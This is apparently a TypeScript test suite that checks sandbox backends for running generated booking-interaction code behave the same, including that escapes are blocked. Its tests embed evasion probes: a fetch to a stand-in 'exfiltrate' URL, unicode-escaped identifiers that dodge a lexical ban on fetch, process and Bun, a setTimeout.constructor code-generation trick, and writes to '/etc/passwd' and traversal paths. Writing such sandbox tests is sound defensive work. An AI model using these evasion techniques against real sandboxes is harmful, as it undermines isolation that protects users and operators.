/**
 * Cross-backend conformance suite for the sandbox execution seam.
 *
 * `runSandboxBackendConformance({ name, createBackend })` registers the
 * executable contract every `SandboxBackend` must pass: for the same payload,
 * every backend must produce the same public executor result and the same
 * normalized trace shape (span set / order / category / status / errorCode
 * and the `sandbox.result` mark), asserted under an injected deterministic
 * clock + id factory so timestamps, durations, and ids normalize out
 * (protocol equivalence after normalization, not byte-for-byte). Runner
 * `callId` values are internal to the NDJSON transport; their shape
 * (`action_<n>`) is asserted by the byte-level tests in
 * `sandbox-ndjson.test.ts`.
 *
 * A new backend is correct iff this suite passes against it. Backend authors
 * write `createXxxSandboxBackend()` plus one test file:
 *
 * ```ts
 * runSandboxBackendConformance({
 *   name: "xxx",
 *   createBackend: createXxxSandboxBackend,
 * });
 * ```
 *
 * Backends with a real, killable transport should also pass
 * `runawayTimeout.createObservedBackend` so the uninterruptible-runaway and
 * stop()-on-timeout cases run; in-process backends (deterministic) omit it
 * because a microtask loop cannot be force-killed — for them the plain
 * timeout case only asserts result normalization.
 *
 * NOTE: this module imports `bun:test` — import it from test files only.
 */
import { describe, expect, test } from "bun:test";
import {
  PublishedInteractionArtifactSchema,
  type PublishedInteractionArtifact,
} from "@tidegate/contracts";
import { cancelAppointmentPublishedArtifact } from "@tidegate/contracts/fixtures";
import type { RuntimeAuthContext } from "./action-catalog.ts";
import {
  createExecutionTraceRecorder,
  createInMemoryExecutionTraceStore,
} from "./execution-tracing.ts";
import {
  createPublishedInteractionActionCallToken,
  createPublishedInteractionExecutionPayload,
  type PublishedInteractionExecutionPayload,
  type PublishedInteractionExecutionResult,
  type PublishedInteractionTrustedRuntime,
} from "./published-interaction-executor.ts";
import {
  SANDBOX_WORKSPACE_WRITE_ORDER,
  type PublishedInteractionSandboxWorkspace,
  type SandboxBackend,
} from "./sandbox-backend.ts";
import {
  createDeterministicExecutionTraceClock,
  createDeterministicIdFactory,
} from "./sandbox-backend-deterministic.ts";
import { createSandboxedPublishedInteractionExecutor } from "./sandbox-executor.ts";

export type SandboxBackendConformanceOptions = {
  name: string;
  createBackend: () => SandboxBackend;
  /**
   * Backends with a real transport provide an instrumented variant so the
   * suite can assert the uninterruptible-runaway timeout and that the driver
   * called the transport's mandatory `stop()`.
   */
  runawayTimeout?: {
    createObservedBackend: () => {
      backend: SandboxBackend;
      getStopCalls: () => number;
    };
  };
};

const conformanceAuth: RuntimeAuthContext = {
  authMode: "api-key",
  organizationId: "demo-salon",
  tenantId: "demo-salon",
  subjectId: "api_key_demo",
  subjectType: "api_key",
  credentialId: "api_key_demo",
  credentialType: "api_key",
  scopes: ["tidegate:interaction:invoke"],
  permissions: ["booking:write"],
  authorization: {
    permissions: ["booking:write"],
    resourceGrants: [],
  },
};

// fetch / process / Bun are lexically banned by the source policy, so the
// strip probe reaches the runtime the way hostile generated code would:
// unicode-escaped identifiers.
const GLOBAL_STRIP_PROBE = String.raw`[
    typeof f\u0065tch,
    typeof pro\u0063ess,
    typeof eval,
    typeof Function,
    typeof B\u0075n,
    typeof Buffer,
    typeof require,
  ].join(" ")`;

const GLOBAL_STRIP_EXPECTED = Array(7).fill("undefined").join(" ");

function cloneArtifact(
  overrides: Partial<PublishedInteractionArtifact> = {},
): PublishedInteractionArtifact {
  return PublishedInteractionArtifactSchema.parse({
    ...structuredClone(cancelAppointmentPublishedArtifact),
    ...overrides,
  });
}

function createPayload({
  artifact,
  invocationId,
}: {
  artifact: PublishedInteractionArtifact;
  invocationId: string;
}): PublishedInteractionExecutionPayload {
  return createPublishedInteractionExecutionPayload({
    actionCallToken: createPublishedInteractionActionCallToken(invocationId),
    artifact,
    auth: conformanceAuth,
    input: {
      appointmentId: "apt_123",
      reason: "Client requested cancellation",
    },
    invocationId,
  });
}

type NormalizedTraceShape = {
  traceStatus: string;
  spans: Array<{
    name: string;
    category: string;
    status: string;
    errorCode: string | undefined;
  }>;
  resultMarks: Array<{
    status: unknown;
    errorCode: unknown;
  }>;
};

type ScenarioRun = {
  result: PublishedInteractionExecutionResult;
  trace: NormalizedTraceShape;
  writes: string[];
};

async function executeScenario({
  backend,
  payload,
  runtime,
}: {
  backend: SandboxBackend;
  payload: PublishedInteractionExecutionPayload;
  runtime: PublishedInteractionTrustedRuntime;
}): Promise<ScenarioRun> {
  const store = createInMemoryExecutionTraceStore();
  const recorder = createExecutionTraceRecorder({
    clock: createDeterministicExecutionTraceClock(),
    idFactory: createDeterministicIdFactory(),
    store,
  });
  const writes: string[] = [];
  const recordingBackend: SandboxBackend = {
    provider: backend.provider,
    workspaceFactory: {
      async createWorkspace(workspacePayload) {
        const workspace =
          await backend.workspaceFactory.createWorkspace(workspacePayload);

        // A Proxy keeps the workspace's prototype (backends may check the
        // concrete class) while recording the orchestrator's write order.
        return new Proxy(workspace, {
          get(target, property, receiver) {
            if (property === "writeTextFile") {
              return (args: { path: string; content: string }) => {
                writes.push(args.path);
                return target.writeTextFile(args);
              };
            }
            return Reflect.get(target, property, receiver);
          },
        }) as PublishedInteractionSandboxWorkspace;
      },
    },
  };
  const executor = createSandboxedPublishedInteractionExecutor({
    backend: recordingBackend,
    tracing: { recorder },
  });

  const result = await executor.execute(payload, runtime);

  const traces = await store.listTraces({ ownerId: "demo-salon" });
  expect(traces).toHaveLength(1);
  const snapshot = await store.getTrace({
    ownerId: "demo-salon",
    traceId: traces[0]!.id,
  });
  expect(snapshot).toBeDefined();

  return {
    result,
    trace: {
      traceStatus: snapshot!.trace.status,
      spans: snapshot!.spans.map((span) => ({
        name: span.name,
        category: span.category,
        status: span.status,
        errorCode: span.errorCode,
      })),
      resultMarks: snapshot!.events
        .filter((event) => event.name === "sandbox.result")
        .map((event) => ({
          status: event.attributes.status,
          errorCode: event.attributes.errorCode,
        })),
    },
    writes,
  };
}

const HAPPY_SPANS: NormalizedTraceShape["spans"] = [
  {
    name: "sandbox.allocate",
    category: "sandbox",
    status: "ok",
    errorCode: undefined,
  },
  {
    name: "sandbox.prepare",
    category: "typecheck",
    status: "ok",
    errorCode: undefined,
  },
  {
    name: "sandbox.run",
    category: "sandbox",
    status: "ok",
    errorCode: undefined,
  },
];

function spansWithRunError(
  errorCode: string,
): NormalizedTraceShape["spans"] {
  return [
    HAPPY_SPANS[0]!,
    HAPPY_SPANS[1]!,
    {
      name: "sandbox.run",
      category: "sandbox",
      status: "error",
      errorCode,
    },
  ];
}

const noActionRuntime: PublishedInteractionTrustedRuntime = {
  async callAction() {
    throw new Error("No action call expected in this scenario.");
  },
};

export function runSandboxBackendConformance({
  createBackend,
  name,
  runawayTimeout,
}: SandboxBackendConformanceOptions): void {
  describe(`sandbox backend conformance: ${name}`, () => {
    test("happy path: identical result, trace shape, and workspace write order", async () => {
      const artifact = cloneArtifact({
        source: `
export default async function run(input) {
  return { ok: true, appointmentId: input.appointmentId };
}
`.trim(),
      });
      const { result, trace, writes } = await executeScenario({
        backend: createBackend(),
        payload: createPayload({
          artifact,
          invocationId: `conformance_happy_${name}`,
        }),
        runtime: noActionRuntime,
      });

      expect(result).toEqual({
        status: "ok",
        output: { ok: true, appointmentId: "apt_123" },
      });
      expect(trace).toEqual({
        traceStatus: "complete",
        spans: HAPPY_SPANS,
        resultMarks: [{ status: "ok", errorCode: undefined }],
      });
      expect(writes).toEqual([...SANDBOX_WORKSPACE_WRITE_ORDER]);
    });

    test("action call: host mediation with the one-invocation token", async () => {
      const calls: unknown[] = [];
      const payload = createPayload({
        artifact: cloneArtifact(),
        invocationId: `conformance_action_${name}`,
      });
      const runtime: PublishedInteractionTrustedRuntime = {
        async callAction(request) {
          calls.push(request);
          return {
            ok: true,
            appointmentId: (request.input as { appointmentId: string })
              .appointmentId,
          };
        },
      };

      const { result, trace } = await executeScenario({
        backend: createBackend(),
        payload,
        runtime,
      });

      expect(result).toEqual({
        status: "ok",
        output: { ok: true, appointmentId: "apt_123" },
      });
      expect(calls).toEqual([
        {
          invocationId: payload.invocationId,
          actionCallToken: payload.actionCallToken,
          actionId: "booking.cancel",
          input: {
            appointmentId: "apt_123",
            reason: "Client requested cancellation",
          },
        },
      ]);
      expect(trace.spans).toEqual(HAPPY_SPANS);
    });

    test("action-token mismatch is rejected as action_not_allowed", async () => {
      const expectedToken = createPublishedInteractionActionCallToken(
        "a_different_invocation",
      );
      const runtime: PublishedInteractionTrustedRuntime = {
        async callAction(request) {
          if (request.actionCallToken !== expectedToken) {
            throw Object.assign(
              new Error(
                "This action call token is not valid for this invocation.",
              ),
              { code: "action_not_allowed", status: "rejected" },
            );
          }
          return { ok: true, appointmentId: "apt_123" };
        },
      };

      const { result, trace } = await executeScenario({
        backend: createBackend(),
        payload: createPayload({
          artifact: cloneArtifact(),
          invocationId: `conformance_token_${name}`,
        }),
        runtime,
      });

      expect(result).toMatchObject({
        status: "rejected",
        error: {
          code: "action_not_allowed",
          message: "This action call token is not valid for this invocation.",
        },
      });
      expect(trace).toEqual({
        traceStatus: "failed",
        spans: spansWithRunError("action_not_allowed"),
        resultMarks: [
          { status: "rejected", errorCode: "action_not_allowed" },
        ],
      });
    });

    test("max-action-call overflow is rejected without reaching the runtime again", async () => {
      let calls = 0;
      const artifact = cloneArtifact({
        source: `
export default async function run(input, ctx) {
  await ctx.capabilities.booking.cancel(input);

  return ctx.capabilities.booking.cancel(input);
}
`.trim(),
      });
      const runtime: PublishedInteractionTrustedRuntime = {
        async callAction() {
          calls += 1;
          return { ok: true, appointmentId: "apt_123" };
        },
      };

      const { result, trace } = await executeScenario({
        backend: createBackend(),
        payload: createPayload({
          artifact,
          invocationId: `conformance_budget_${name}`,
        }),
        runtime,
      });

      expect(calls).toBe(1);
      expect(result).toMatchObject({
        status: "rejected",
        error: {
          code: "action_not_allowed",
          message: "This interaction exceeded its action call limit.",
        },
      });
      expect(trace.spans).toEqual(spansWithRunError("action_not_allowed"));
      expect(trace.resultMarks).toEqual([
        { status: "rejected", errorCode: "action_not_allowed" },
      ]);
    });

    test("a throwing interaction fails as interaction_failed", async () => {
      const artifact = cloneArtifact({
        source: `
export default async function run() {
  throw new Error("boom");
}
`.trim(),
      });

      const { result, trace } = await executeScenario({
        backend: createBackend(),
        payload: createPayload({
          artifact,
          invocationId: `conformance_throw_${name}`,
        }),
        runtime: noActionRuntime,
      });

      expect(result).toMatchObject({
        status: "failed",
        error: { code: "interaction_failed", message: "boom" },
      });
      expect(trace).toEqual({
        traceStatus: "failed",
        spans: spansWithRunError("interaction_failed"),
        resultMarks: [{ status: "failed", errorCode: "interaction_failed" }],
      });
    });

    test("top-level await resolves before the interaction runs (ESM semantics)", async () => {
      const artifact = cloneArtifact({
        source: `
const topLevelValue = await Promise.resolve("tla_ok");

export default async function run(input) {
  return { ok: true, appointmentId: input.appointmentId, topLevelValue };
}
`.trim(),
      });

      const { result, trace } = await executeScenario({
        backend: createBackend(),
        payload: createPayload({
          artifact,
          invocationId: `conformance_tla_${name}`,
        }),
        runtime: noActionRuntime,
      });

      expect(result).toEqual({
        status: "ok",
        output: {
          ok: true,
          appointmentId: "apt_123",
          topLevelValue: "tla_ok",
        },
      });
      expect(trace.spans).toEqual(HAPPY_SPANS);
    });

    test("a module that throws during top-level evaluation fails with its message", async () => {
      const artifact = cloneArtifact({
        source: `
throw new Error("top-level boom");

export default async function run() {
  return { ok: true };
}
`.trim(),
      });

      const { result, trace } = await executeScenario({
        backend: createBackend(),
        payload: createPayload({
          artifact,
          invocationId: `conformance_toplevel_throw_${name}`,
        }),
        runtime: noActionRuntime,
      });

      expect(result).toMatchObject({
        status: "failed",
        error: { code: "interaction_failed", message: "top-level boom" },
      });
      expect(trace.spans).toEqual(spansWithRunError("interaction_failed"));
    });

    test("timer primitives available to the local runner exist in every backend", async () => {
      const artifact = cloneArtifact({
        source: `
export default async function run(input) {
  const immediateTag = await new Promise((resolve) => {
    setImmediate(() => resolve("immediate"));
  });
  const intervalTicks = await new Promise((resolve) => {
    let ticks = 0;
    const intervalId = setInterval(() => {
      ticks += 1;
      if (ticks >= 2) {
        clearInterval(intervalId);
        resolve(ticks);
      }
    }, 1);
  });
  clearImmediate(setImmediate(() => {}));

  return { ok: true, appointmentId: input.appointmentId, immediateTag, intervalTicks };
}
`.trim(),
      });

      const { result } = await executeScenario({
        backend: createBackend(),
        payload: createPayload({
          artifact,
          invocationId: `conformance_timers_${name}`,
        }),
        runtime: noActionRuntime,
      });

      expect(result).toEqual({
        status: "ok",
        output: {
          ok: true,
          appointmentId: "apt_123",
          immediateTag: "immediate",
          intervalTicks: 2,
        },
      });
    });

    test("source-policy violations are rejected before any backend work", async () => {
      const artifact = cloneArtifact({
        source: `
export default async function run() {
  return fetch("https://example.test/exfiltrate");
}
`.trim(),
      });

      const { result, trace, writes } = await executeScenario({
        backend: createBackend(),
        payload: createPayload({
          artifact,
          invocationId: `conformance_policy_${name}`,
        }),
        runtime: noActionRuntime,
      });

      expect(result).toMatchObject({
        status: "rejected",
        error: { code: "action_not_allowed" },
      });
      expect(trace).toEqual({
        traceStatus: "failed",
        spans: [],
        resultMarks: [
          { status: "rejected", errorCode: "action_not_allowed" },
        ],
      });
      expect(writes).toEqual([]);
    });

    test("capability/allowlist mismatch is rejected before any backend work", async () => {
      const base = createPayload({
        artifact: cloneArtifact(),
        invocationId: `conformance_allowlist_${name}`,
      });
      const mismatched = {
        ...structuredClone(base),
        allowedActionIds: [...base.allowedActionIds, "booking.extra"],
      } as PublishedInteractionExecutionPayload;

      const { result, trace, writes } = await executeScenario({
        backend: createBackend(),
        payload: mismatched,
        runtime: noActionRuntime,
      });

      expect(result).toMatchObject({
        status: "rejected",
        error: { code: "action_not_allowed" },
      });
      expect(trace.spans).toEqual([]);
      expect(writes).toEqual([]);
    });

    test("global strip holds at module top-level AND at runtime", async () => {
      const artifact = cloneArtifact({
        source: String.raw`
const topLevel = ${GLOBAL_STRIP_PROBE};

export default async function run() {
  const atRuntime = ${GLOBAL_STRIP_PROBE};

  return { ok: true, appointmentId: topLevel + "|" + atRuntime };
}
`.trim(),
      });

      const { result } = await executeScenario({
        backend: createBackend(),
        payload: createPayload({
          artifact,
          invocationId: `conformance_globals_${name}`,
        }),
        runtime: noActionRuntime,
      });

      expect(result).toEqual({
        status: "ok",
        output: {
          ok: true,
          appointmentId: `${GLOBAL_STRIP_EXPECTED}|${GLOBAL_STRIP_EXPECTED}`,
        },
      });
    });

    test("dynamic code generation from strings stays disabled at runtime", async () => {
      const artifact = cloneArtifact({
        source: String.raw`
export default async function run() {
  return setTimeout.constr\u0075ctor("return 1")();
}
`.trim(),
      });

      const { result } = await executeScenario({
        backend: createBackend(),
        payload: createPayload({
          artifact,
          invocationId: `conformance_codegen_${name}`,
        }),
        runtime: noActionRuntime,
      });

      expect(result).toMatchObject({
        status: "failed",
        error: { code: "interaction_failed" },
      });
    });

    test("workspace rejects path traversal and absolute paths", async () => {
      const backend = createBackend();
      const workspace = await backend.workspaceFactory.createWorkspace(
        createPayload({
          artifact: cloneArtifact(),
          invocationId: `conformance_traversal_${name}`,
        }),
      );

      try {
        for (const path of ["../escape.mjs", "nested/../../escape.mjs", "/etc/passwd"]) {
          await expect(
            Promise.resolve(
              workspace.writeTextFile({ path, content: "malicious" }),
            ),
          ).rejects.toThrow();
        }
      } finally {
        await workspace.cleanup();
      }
    });

    test("a never-settling interaction normalizes to timed_out", async () => {
      const artifact = cloneArtifact({
        source: `
export default async function run() {
  await new Promise(() => {});

  return { ok: true, appointmentId: "apt_never" };
}
`.trim(),
        timeout: {
          ...cancelAppointmentPublishedArtifact.timeout,
          executionMs: 50,
        },
      });

      const { result, trace } = await executeScenario({
        backend: createBackend(),
        payload: createPayload({
          artifact,
          invocationId: `conformance_timeout_${name}`,
        }),
        runtime: noActionRuntime,
      });

      expect(result).toMatchObject({
        status: "timed_out",
        error: { code: "interaction_timeout" },
      });
      expect(trace.spans).toEqual(spansWithRunError("interaction_timeout"));
      expect(trace.resultMarks).toEqual([
        { status: "timed_out", errorCode: "interaction_timeout" },
      ]);
    });

    if (runawayTimeout !== undefined) {
      test("an uninterruptible runaway is timed out and the transport is stopped", async () => {
        const { backend, getStopCalls } =
          runawayTimeout.createObservedBackend();
        const artifact = cloneArtifact({
          source: `
export default async function run() {
  for (;;) {}
}
`.trim(),
          timeout: {
            ...cancelAppointmentPublishedArtifact.timeout,
            executionMs: 50,
          },
        });

        const { result } = await executeScenario({
          backend,
          payload: createPayload({
            artifact,
            invocationId: `conformance_runaway_${name}`,
          }),
          runtime: noActionRuntime,
        });

        expect(result).toMatchObject({
          status: "timed_out",
          error: { code: "interaction_timeout" },
        });
        expect(getStopCalls()).toBeGreaterThanOrEqual(1);
      });
    }
  });
}
